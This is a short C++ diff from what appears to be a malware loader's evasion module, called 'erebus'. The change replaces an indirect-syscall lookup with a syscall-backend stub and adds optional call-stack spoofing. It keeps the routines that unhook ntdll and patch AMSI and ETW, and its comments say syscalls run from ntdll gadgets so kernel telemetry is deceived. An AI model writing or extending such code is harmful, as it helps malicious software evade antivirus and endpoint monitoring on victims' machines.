@@ -19,7 +19,10 @@
 
 #include "../../include/loader.hpp"
 #include "../../include/evasion/evasion.hpp"
-#include "../../include/evasion/syscalls.hpp"
+#include "../../include/evasion/syscall_backend.hpp"
+#if CONFIG_CALLSTACK_SPOOF_ENABLED
+#include "../../include/evasion/callstack_spoof.hpp"
+#endif
 
 namespace erebus {
 namespace evasion {
@@ -35,7 +38,7 @@ namespace evasion {
         // jmp <gadget>`, so the actual `syscall` instruction executes from
         // inside ntdll's .text where kernel telemetry expects it.
         typeNtProtectVirtualMemory NtProtectVirtualMemory =
-            (typeNtProtectVirtualMemory)GetIndirectSyscall(H("NtProtectVirtualMemory"));
+            (typeNtProtectVirtualMemory)GetSyscallStub(H("NtProtectVirtualMemory"));
 
         // Fall back to the (post-unhook) hashed import if the indirect
         // path is unavailable. This covers the narrow window before
@@ -173,6 +176,10 @@ namespace evasion {
         // AMSI / ETW patches still have a chance of landing through
         // whatever hook is in place.
         UnhookNtdll();
+
+#if CONFIG_CALLSTACK_SPOOF_ENABLED
+        InitCallstackSpoof();
+#endif
 
         BOOL amsi_ok = PatchAmsi();
         BOOL etw_ok  = PatchEtw();
